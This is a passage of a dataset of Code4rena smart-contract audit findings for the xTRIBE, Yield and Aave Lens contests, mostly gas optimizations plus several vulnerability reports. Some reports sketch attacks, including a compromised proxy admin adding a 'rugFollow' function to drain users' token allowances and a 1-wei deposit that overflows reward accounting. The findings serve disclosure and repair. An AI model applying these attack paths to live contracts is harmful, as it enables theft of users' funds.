assert(queuedRewards.storedCycle == 0 || queuedRewards.storedCycle >= lastCycle);\nflywheel-v2/src/rewards/FlywheelGaugeRewards.sol:235:        assert(queuedRewards.storedCycle >= cycle);\n```\n\nAs the Solidity version is > 0.8.* the remaining gas would still be refunded in case of failure.\n\n## [N-02] Missing comments\n\nThe following comments are missing (see `@audit` tags):\n\n```solidity\nlib/flywheel-v2/src/token/ERC20Gauges.sol:\n  127      /** \n  128        @notice returns a paginated subset of live gauges\n  129        @param offset the index of the first gauge element to read\n  130:       @param num the number of gauges to return //@audit missing @return values\n  131      */\n  132      function gauges(uint256 offset, uint256 num) external view returns (address[] memory values) {\n  171  \n  172      /** \n  173        @notice returns a paginated subset of gauges the user has allocated to, may be live or deprecated.\n  174        @param user the user to return gauges from.\n  175        @param offset the index of the first gauge element to read.\n  176:       @param num the number of gauges to return. //@audit missing @return values\n  177      */\n  178      function userGauges(\n  179          address user,\n  180          uint256 offset,\n  181          uint256 num\n  182      ) external view returns (address[] memory values) {\n```\n\n## [N-03] Unused named returns\n\nUsing both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:\n\n```solidity\nlib/flywheel-v2/src/token/ERC20Gauges.sol:\n  245:     function incrementGauge(address gauge, uint112 weight) external returns (uint112 newUserWeight) { //@audit unused named returns\n\n  294      function incrementGauges(address[] calldata gaugeList, uint112[] calldata weights)\n  295          external\n  296:         returns (uint256 newUserWeight)  //@audit unused named returns\n\n  370      function decrementGauges(address[] calldata gaugeList, uint112[] calldata weights)\n  371          external\n  372:         returns (uint112 newUserWeight)  //@audit unused named returns\n```\n\n## [N-04] It's better to emit after all processing is done\n\n```solidity\nlib/flywheel-v2/src/token/ERC20MultiVotes.sol:\n  254:         emit Delegation(delegator, delegatee, amount); //@audit emit later\n  255          _writeCheckpoint(delegatee, _add, amount);\n\n  272:         emit Undelegation(delegator, delegatee, amount); //@audit emit later\n  273          _writeCheckpoint(delegatee, _subtract, amount);\n```\n\n## [N-05] Upgrade pragma to at least 0.8.4\n\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n  \nThe advantages here are:\n\n- **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).  \n- **Optimizer improvements in packed structs** (>= 0.8.3)\n- **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nAffected code:\n\n```solidity\nERC4626/src/xERC4626.sol:4:pragma solidity ^0.8.0;\nflywheel-v2/src/token/ERC20Gauges.sol:3:pragma solidity ^0.8.0;\nflywheel-v2/src/token/ERC20MultiVotes.sol:4:pragma solidity ^0.8.0;\n```\n\n## [N-06] Avoid floating pragmas: the version should be locked\n\n```solidity\nlib/ERC4626/src/xERC4626.sol:\n  4: pragma solidity ^0.8.0;\n\nlib/flywheel-v2/src/token/ERC20Gauges.sol:\n  3: pragma solidity ^0.8.0;\n\nlib/flywheel-v2/src/token/ERC20MultiVotes.sol:\n  4: pragma solidity ^0.8.0;\n\nlib/xTRIBE/src/xTRIBE.sol:\n  4: pragma solidity ^0.8.0;\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/64"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Float multiplication optimization\nWe can use the following function to save gas on float multiplications\n```\n// out = x * y unchecked{/} z\nfunction fmul(uint256 x, uint256 y, uint256 z) internal pure returns(uint256 out){\nassembly{\nif iszero(eq(div(mul(x,y),x),y)) {revert(0,0)}\nout := div(mul(x,y),z)\n}\n}\n```\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L214\n\n## For loop optimization\n```\nfor(uint256 i; i < length; ){\n...\nunchecked{ ++i; }\n}\n```\n```\nsrc/token/ERC20MultiVotes.sol:346:        for (uint256 i = 0; i < size && (userFreeVotes + totalFreed) < votes; i++) {\n```\n\n## Unnecessary safeTransfer\n`flywheelRewards` use solmate ERC20 which is known to revert on failed transfer\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L125\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/62"
    }
  },
  {
    "title": "Incorrect accounting of free weight in `_decrementWeightUntilFree`",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L547-L583\n\n\n# Vulnerability details\n\n## Impact\nIn `_decrementWeightUntilFree`, the free weight is calculated by `balanceOf[user] - getUserWeight[user]` plus weight freed from non-deprecated gauges. The non-deprecated criteria is unnecessary and lead to incorrect accounting of free weight.\n\n## Proof of Concept\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L547-L583\n```\n    function _decrementWeightUntilFree(address user, uint256 weight) internal {\n        uint256 userFreeWeight = balanceOf[user] - getUserWeight[user];\n\n        // early return if already free\n        if (userFreeWeight >= weight) return;\n\n        uint32 currentCycle = _getGaugeCycleEnd();\n\n        // cache totals for batch updates\n        uint112 userFreed;\n        uint112 totalFreed;\n\n        // Loop through all user gauges, live and deprecated\n        address[] memory gaugeList = _userGauges[user].values();\n\n        // Free gauges until through entire list or under weight\n        uint256 size = gaugeList.length;\n        for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight; ) {\n            address gauge = gaugeList[i];\n            uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];\n            if (userGaugeWeight != 0) {\n                // If the gauge is live (not deprecated), include its weight in the total to remove\n                if (!_deprecatedGauges.contains(gauge)) {\n                    totalFreed += userGaugeWeight;\n                }\n                userFreed += userGaugeWeight;\n                _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle);\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n\n        getUserWeight[user] -= userFreed;\n        _writeGaugeWeight(_totalWeight, _subtract, totalFreed, currentCycle);\n    }\n```\nConsider Alice allocated 3 weight to gauge D, gauge A and gauge B equally where gauge D is depricated\n1. Alice call _decrementWeightUntilFree(alice, 2)\n2. userFreeWeight = 0\n3. gauge D is freed, totalFreed = 0, userFreed = 1\n4. (userFreeWeight + totalFreed) < weight, continue to free next gauge\n5. gauge A is freed, totalFreed = 1, userFreed = 2\n6. (userFreeWeight + totalFreed) < weight, continue to free next gauge\n7. gauge B is freed, totalFreed = 2, userFreed = 3\n8. All gauge is freed\n\nAlternatively, Alice can\n1. Alice call _decrementWeightUntilFree(alice, 1)\n2. userFreeWeight = balanceOf[alice] - getUserWeight[alice] = 3 - 3 = 0\n3. gauge D is freed, totalFreed = 0, userFreed = 1\n4. (userFreeWeight + totalFreed) < weight, continue to free next gauge\n5. gauge A is freed, totalFreed = 1, userFreed = 2\n6. (userFreeWeight + totalFreed) >= weight, break\n7. getUserWeight[alice] -= totalFreed\n8. Alice call _decrementWeightUntilFree(alice, 2)\n9. userFreeWeight = balanceOf[alice] - getUserWeight[alice] = 3 - 1 = 2\n10. (userFreeWeight + totalFreed) >= weight, break\n11. Only 2 gauge is freed\n\n## Recommended Mitigation Steps\nNo need to treat deprecated gauge seperately\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/61"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Save gas in for loops by unchecked arithmetic\n\nThe for loop has no overflow risk of `i`. Use an unchecked block to save gas.\n\n## Proof of Concept\n\n```\nflywheel-v2/src/token/ERC20MultiVotes.sol\n346:        for (uint256 i = 0; i < size && (userFreeVotes + totalFreed) < votes; i++) {\n\nflywheel-v2/src/rewards/FlywheelGaugeRewards.sol\n189:        for (uint256 i = 0; i < size; i++) {\n```\n\n## Recommendation\n\nUse `unchecked` blocks to avoid overflow checks, or use `++i` rather than `i++` if you don't use unchecked blocks.\n\n```\nfor (uint256 i = 0; i < length; ) {\n    ...\n    unchecked {\n        ++i;\n    }\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/59"
    }
  },
  {
    "title": "Rewards distribution can be disrupted by a early user",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-yield/blob/e946f40239b33812e54fafc700eb2298df1a2579/contracts/ConvexStakingWrapper.sol#L206-L224\n\n```solidity\nfunction _calcRewardIntegral(\n    uint256 _index,\n    address[2] memory _accounts,\n    uint256[2] memory _balances,\n    uint256 _supply,\n    bool _isClaim\n) internal {\n    RewardType storage reward = rewards[_index];\n\n    uint256 rewardIntegral = reward.reward_integral;\n    uint256 rewardRemaining = reward.reward_remaining;\n\n    //get difference in balance and remaining rewards\n    //getReward is unguarded so we use reward_remaining to keep track of how much was actually claimed\n    uint256 bal = IERC20(reward.reward_token).balanceOf(address(this));\n    if (_supply > 0 && (bal - rewardRemaining) > 0) {\n        rewardIntegral = uint128(rewardIntegral) + uint128(((bal - rewardRemaining) * 1e20) / _supply);\n        reward.reward_integral = uint128(rewardIntegral);\n    }\n```\n\n`reward.reward_integral` is `uint128`, if a early user mint (wrap) just `1` Wei of `convexToken`, and make `_supply == 1`, and then tranferring `5e18` of `reward_token` to the contract.\n\nAs a result, `reward.reward_integral` can exceed `type(uint128).max` and overflow, causing the rewards distribution to be disrupted.\n\n### Recommendation\n\nConsider `wrap` a certain amount of initial totalSupply, e.g. `1e8`, and never burn it. And consider using uint256 instead of uint128 for `reward.reward_integral`. Also, consdier lower `1e20` down to `1e12`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-yield-findings",
      "repo": "https://github.com/code-423n4/2022-01-yield-findings",
      "url": "https://github.com/code-423n4/2022-01-yield-findings/issues/116"
    }
  },
  {
    "title": "Perform math inside code branch",
    "body": "# Handle\n\nsirhashalot\n\n\n# Vulnerability details\n\n## Impact\n\nThe `_calcCvxIntegral()` function in ConvexStakingWrapper.sol doesn't use the same gas optimization that its sibling function `_calcRewardIntegral()` uses.\n\n## Proof of Concept\n\nThis code is from [the `_calcCvxIntegral()` function](https://github.com/code-423n4/2022-01-yield/blob/e946f40239b33812e54fafc700eb2298df1a2579/contracts/ConvexStakingWrapper.sol#L154)\n```\nif (_isClaim || userI < cvxRewardIntegral) {\n    uint256 receiveable = cvx_claimable_reward[_accounts[u]] +\n        ((_balances[u] * (cvxRewardIntegral - userI)) / 1e20);\n    if (_isClaim) {\n        if (receiveable > 0) {\n            cvx_claimable_reward[_accounts[u]] = 0;\n            IERC20(cvx).safeTransfer(_accounts[u], receiveable);\n            bal = bal - (receiveable);\n        }\n    } else {\n        cvx_claimable_reward[_accounts[u]] = receiveable;\n    }\n    cvx_reward_integral_for[_accounts[u]] = cvxRewardIntegral;\n}\n```\n\nThe related code from [the `_calcRewardIntegral()` function](https://github.com/code-423n4/2022-01-yield/blob/e946f40239b33812e54fafc700eb2298df1a2579/contracts/ConvexStakingWrapper.sol#L206) has the receivable calculation inside the `if (_isClaim)` code branch to save gas if _isClaim is false.\n\n```\nif (_isClaim || userI < rewardIntegral) {\n    if (_isClaim) {\n        uint256 receiveable = reward.claimable_reward[_accounts[u]] +\n            ((_balances[u] * (uint256(rewardIntegral) - userI)) / 1e20);\n        if (receiveable > 0) {\n            reward.claimable_reward[_accounts[u]] = 0;\n            IERC20(reward.reward_token).safeTransfer(_accounts[u], receiveable);\n            bal = bal - receiveable;\n        }\n    } else {\n        reward.claimable_reward[_accounts[u]] =\n            reward.claimable_reward[_accounts[u]] +\n            ((_balances[u] * (uint256(rewardIntegral) - userI)) / 1e20);\n    }\n    reward.reward_integral_for[_accounts[u]] = rewardIntegral;\n}\n```\n\nThis optimization would save gas each time `_checkpoint()` is called because `_checkpoint()` sets _isClaim to false and doesn't enter the `if(_isClaim)` branch. \n\n## Recommended Mitigation Steps\n\nModify the `_calcCvxIntegral()` function to place the receiveable calculation inside the `if (_isClaim)` code branch.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-yield-findings",
      "repo": "https://github.com/code-423n4/2022-01-yield-findings",
      "url": "https://github.com/code-423n4/2022-01-yield-findings/issues/106"
    }
  },
  {
    "title": "`ConvexStakingWrapper.sol`: related data should be grouped in a struct",
    "body": "# Handle\n\nDravee\n\n\n# Vulnerability details\n\n## Impact\nFor maps that use the same key value: having separate fields is error prone (like in case of deletion or future new fields).\n\n## Proof of Concept\nIn `ConvexStakingWrapper.sol`, these 2 lines use the same addresses in their map:\n```\n34:     mapping(address => uint256) public cvx_reward_integral_for;\n35:     mapping(address => uint256) public cvx_claimable_reward;\n```\nSee the @audit-info tags in `_calcCvxIntegral()` for more details:\n```\nFile: ConvexStakingWrapper.sol\n177:             uint256 userI = cvx_reward_integral_for[_accounts[u]]; // @audit-info cvx_reward_integral_for using address _accounts[u]  \n178:             if (_isClaim || userI < cvxRewardIntegral) {\n179:                 uint256 receiveable = cvx_claimable_reward[_accounts[u]] + // @audit-info cvx_claimable_reward using address _accounts[u]  \n180:                     ((_balances[u] * (cvxRewardIntegral - userI)) / 1e20);\n181:                 if (_isClaim) {\n182:                     if (receiveable > 0) {\n183:                         cvx_claimable_reward[_accounts[u]] = 0; // @audit-info cvx_claimable_reward using address _accounts[u]  \n184:                         IERC20(cvx).safeTransfer(_accounts[u], receiveable);\n185:                         bal = bal - (receiveable);\n186:                     }\n187:                 } else {\n188:                     cvx_claimable_reward[_accounts[u]] = receiveable; // @audit-info cvx_claimable_reward using address _accounts[u]  \n189:                 }\n190:                 cvx_reward_integral_for[_accounts[u]] = cvxRewardIntegral; // @audit-info cvx_reward_integral_for using address _accounts[u]  \n191:             }\n```\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nI'd suggest these 2 related data get grouped in a struct, let's name it `CvxRewardInfo`:\n```\nstruct CvxRewardInfo {\n  uint256 integralFor;\n  uint256 claimable;\n}\n```\nAnd it would be used as a state variable in this manner:\n```\nmapping(address => CvxRewardInfo) cvxRewardInfo;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-yield-findings",
      "repo": "https://github.com/code-423n4/2022-01-yield-findings",
      "url": "https://github.com/code-423n4/2022-01-yield-findings/issues/76"
    }
  },
  {
    "title": "`ConvexStakingWrapper.sol`: `AccessControl` capabilities aren't used",
    "body": "# Handle\n\nDravee\n\n\n# Vulnerability details\n\n## Impact\nAccessControl capabilities aren't used.\n\n## Proof of Concept\nIn `ConvexStakingWrapper.sol`, `AccessControl` seem superfluous:\n```\n7: import \"@yield-protocol/utils-v2/contracts/access/AccessControl.sol\";\n...\n15: contract ConvexStakingWrapper is ERC20, AccessControl {\n```\nIn the original `ConvexStakingWrapper.sol`, this `AccessControl` isn't inherited. \n\nIn this contract, I believe role-based capabilities were thought of, but were forgotten or abandonned.\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nEither use the capabilities from `AccessControl`, or delete the import + the inheritance to save gas.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-yield-findings",
      "repo": "https://github.com/code-423n4/2022-01-yield-findings",
      "url": "https://github.com/code-423n4/2022-01-yield-findings/issues/75"
    }
  },
  {
    "title": "caching curveToken in  memory can cost less gas",
    "body": "# Handle\n\nFunen\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-yield/blob/main/contracts/ConvexStakingWrapper.sol#L94-L95\n\n```\nIERC20(curveToken).approve(convexBooster, 0);\nIERC20(curveToken).approve(convexBooster, type(uint256).max);\n```\n\n`curveToken` was called mutiple times, caching it in `memory` , it can cost less gas\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-yield-findings",
      "repo": "https://github.com/code-423n4/2022-01-yield-findings",
      "url": "https://github.com/code-423n4/2022-01-yield-findings/issues/49"
    }
  },
  {
    "title": "[WP-H3] Imprecise management of users' allowance allows the admin of the upgradeable proxy contract to rug users",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FeeFollowModule.sol#L75-L91\n\n\n# Vulnerability details\n\nIn the current implementation, when there is a fee on follow or collect, users need to approve to the follow modules or collect module contract, and then the `Hub` contract can call `processFollow()` and transfer funds from an arbitrary address (as the `follower` parameter).\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FeeFollowModule.sol#L75-L91\n\n```solidity\nfunction processFollow(\n    address follower,\n    uint256 profileId,\n    bytes calldata data\n) external override onlyHub {\n    uint256 amount = _dataByProfile[profileId].amount;\n    address currency = _dataByProfile[profileId].currency;\n    _validateDataIsExpected(data, currency, amount);\n\n    (address treasury, uint16 treasuryFee) = _treasuryData();\n    address recipient = _dataByProfile[profileId].recipient;\n    uint256 treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n    uint256 adjustedAmount = amount - treasuryAmount;\n\n    IERC20(currency).safeTransferFrom(follower, recipient, adjustedAmount);\n    IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n}\n```\n\nA common practice is asking users to approve an unlimited amount to the contracts. Normally, the `allowance` can only be used by the user who initiated the transaction.\n\nIt's not a problem as long as `transferFrom` will always only transfer funds from `msg.sender` and the contract is non-upgradable.\n\nHowever, the `LensHub` contract is upgradeable, and `FeeFollowModule` will `transferFrom` an address decided by an input parameter `follower`, use of upgradeable proxy contract structure allows the logic of the contract to be arbitrarily changed.\n\nThis allows the proxy admin to perform many malicious actions, including taking funds from users' wallets up to the allowance limit.\n\nThis action can be performed by the malicious/compromised proxy admin without any restriction.\n\n### PoC\n\nGiven:\n\n- profileId `1` uses `FeeCollectModule` with `currency` = `WETH` and `amount` = `1e18`\n- Alice is rich (with 1,000,000 WETH in wallet balance)\n\n1. Alice `approve()` `type(uint256).max` to `FeeCollectModule` and `follow()` profileId `1` with `1e18 WETH`;\n2. A malicious/compromised proxy admin can call `upgradeToAndCall()` on the proxy contract and set a malicious contract as `newImplementation`, adding a new functions:\n\n```solidity\nfunction rugFollow(address follower, address followModule, uint256 profileId, bytes calldata data)\n    external\n{\n    IFollowModule(followModule).processFollow(\n        follower,\n        profileIds,\n        data\n    );\n}\n```\n3. The attacker creates a new profile with `FeeCollectModule` and set `currency` = `WETH` and `amount` = `1,000,000`, got profileId = `2`\n4. The attacker `rugFollow()` with `follower` = `Alice`, profileId = `2`, stolen `1,000,000` WETH from Alice's wallet\n\n\n### Recommendation\n\nImproper management of users' `allowance` is the root cause of some of the biggest attacks in the history of DeFi security. We believe there are 2 rules that should be followed:\n\n1. the `from` of `transferFrom` should always be `msg.sender`;\n2. the contracts that hold users' `allowance` should always be non-upgradable.\n\nWe suggest adding a non-upgradeable contract for processing user payments:\n\n```solidity\nfunction followWithFee(uint256 profileId, bytes calldata data)\n    external\n{\n    (address currency, uint256 amount) = abi.decode(data, (address, uint256));\n    IERC20(currency).transferFrom(msg.sender, HUB, amount);\n\n    uint256[] memory profileIds = new uint256[](1);\n    profileIds[0] = profileId;\n\n    bytes[] memory datas = new bytes[](1);\n    datas[0] = data;\n\n    IHUB(HUB).follow(profileIds, datas);\n}\n```\n\nThis comes with an additional benefit: users only need to approve one contract instead of approving multiple `follow` or `collect` module contracts. \n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-aave-lens-findings",
      "repo": "https://github.com/code-423n4/2022-02-aave-lens-findings",
      "url": "https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68"
    }
  },
  {
    "title": "[WP-M1] Inappropriate handling of `referralFee` makes collecting Mirror fails without error when `referrerProfileId` is burned",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/FeeCollectModule.sol#L163-L172\n\n\n# Vulnerability details\n\nIn the current implementation, even when the profile's owner burnt the `ProfileNFT`, as the profile's legacy, the publications can still be collected.\n\nHowever, if the publication is a `Mirror` and there is a `referralFee` set by the original publication, the user won't be able to collect from a `Mirror` that was published by a burned profile.\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/FeeCollectModule.sol#L163-L172\n\n```solidity\nif (referralFee != 0) {\n    // The reason we levy the referral fee on the adjusted amount is so that referral fees\n    // don't bypass the treasury fee, in essence referrals pay their fair share to the treasury.\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount - referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n}\n```\n\n> When a mirror is collected, what happens behind the scenes is the original, mirrored publication is collected, and the mirror publisher's profile ID is passed as a \"referrer.\"\n\nIn `_processCollectWithReferral()`, if there is a `referralFee`, contract will read `referralRecipient` from `IERC721(HUB).ownerOf(referrerProfileId)`, if `referrerProfileId` is burned, the `IERC721(HUB).ownerOf(referrerProfileId)` will revert with `ERC721: owner query for nonexistent token`.\n\nHowever, since we wish to allow the content to be collected, we should just treat referrals as non-existent in this situation.\n\n### Recommendation\n\nChange to:\n\n```solidity\ntry IERC721(HUB).ownerOf(referrerProfileId) returns (address referralRecipient) {\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount - referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n} catch {\n    emit LogNonExistingReferrer(referrerProfileId);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-aave-lens-findings",
      "repo": "https://github.com/code-423n4/2022-02-aave-lens-findings",
      "url": "https://github.com/code-423n4/2022-02-aave-lens-findings/issues/67"
    }
  },
  {
    "title": "Collect modules can fail on zero amount transfers if treasury fee is set to zero",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L176\n\n\n# Vulnerability details\n\n## Impact\n\nTreasury fee can be zero, while collect modules do attempt to send it in such a case anyway as there is no check in place. Some ERC20 tokens do not allow zero value transfers, reverting such attempts.\n\nThis way, a combination of zero treasury fee and such a token set as a collect fee currency will revert any collect operations, rendering collect functionality unavailable\n\n## Proof of Concept\n\nTreasury fee can be set to zero:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L109\n\nTreasury fee transfer attempts are now done uncoditionally in all the collect modules.\n\nNamely, FeeCollectModule, LimitedFeeCollectModule, TimedFeeCollectModule and LimitedTimedFeeCollectModule do not check the treasury fee to be send, `treasuryAmount`, before transferring:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L176\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L194\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L190\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L205\n\nThe same happens in the FeeFollowModule:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L90\n\n## References\n\nSome ERC20 tokens revert on zero value transfers:\n\nhttps://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\n\n## Recommended Mitigation Steps\n\nConsider checking the treasury fee amount and do transfer only when it is positive.\n\nNow:\n```\nIERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n```\n\nTo be:\n```\nif (treasuryAmount > 0)\n\tIERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-aave-lens-findings",
      "repo": "https://github.com/code-423n4/2022-02-aave-lens-findings",
      "url": "https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "\n# 1. Loops can be more efficient\n\n## Impact\n\nThe local variable used as for loop index need not be initialized to 0 because the default value is 0. Avoiding this anti-pattern can save a few opcodes and therefore a tiny bit of gas.\n## Proof of Concept\n```\nfor (uint256 i = 0; i < vars.datas.length; ++i) {\n```\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L541\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/ApprovalFollowModule.sol#L41\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/ApprovalFollowModule.sol#L66\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/ApprovalFollowModule.sol#L128\n\nThe same situation are in other scope contracts where loops use.\nRemix\n## Recommended Mitigation Steps\n\nRemove explicit 0 initialization of for loop index variable.\n\n# 2. Long Revert Strings \n\n## Impact\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/base/ERC721Time.sol#L77\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/base/ERC721Time.sol#L86\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/base/ERC721Time.sol#L95\n\nThere are several other places throughout the codebase where the same optimization can be used.\n\n\n## Tools\n\nhttps://planetcalc.com/9029/\n## Recommended Mitigation Steps\nShorten the revert strings to fit in 32 bytes.\n\n# 3. > 0 can be replaced with != 0 for gas optimisation\n# Vulnerability details\n## Impact\n!= 0 is a cheaper operation compared to > 0, when dealing with uint.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/ApprovalFollowModule.sol#L64\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/base/ERC721Time.sol#L135\n\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\n\n# 4. Adding unchecked directive can save gas \n\n## Impact\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L72\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/TimedFeeCollectModule.sol#L71\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/FollowNFT.sol#L106-L145\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/FollowNFT.sol#L148-L187\n\n\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nConsider using 'unchecked' where it is safe to do so.\n\n# 5. A variable is being assigned its default value\n\n# Vulnerability details\n## Impact\nA variable is being assigned its default value which is unnecessary.\nRemoving the assignment will save gas when deploying.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/upgradeability/VersionedInitializable.sol#L29\n\n```\nuint256 private lastInitializedRevision = 0;\n```\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nRemove the assignment.\n\n\n# 6. Less than 256 uints are not gas efficient\n# Vulnerability details\n## Impact\nLower than uint256 size storage instance variables are actually less gas efficient. E.g. using uint24 does not give any efficiency, actually, it is the opposite as EVM operates on default of 256-bit values so uint24 is more expensive in this case as it needs a conversion. It only gives improvements in cases where you can pack variables together, e.g. structs.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L48\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/libraries/Constants.sol#L10\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/FeeModuleBase.sol#L17\n\n```\nuint24 internal constant ONE_DAY = 24 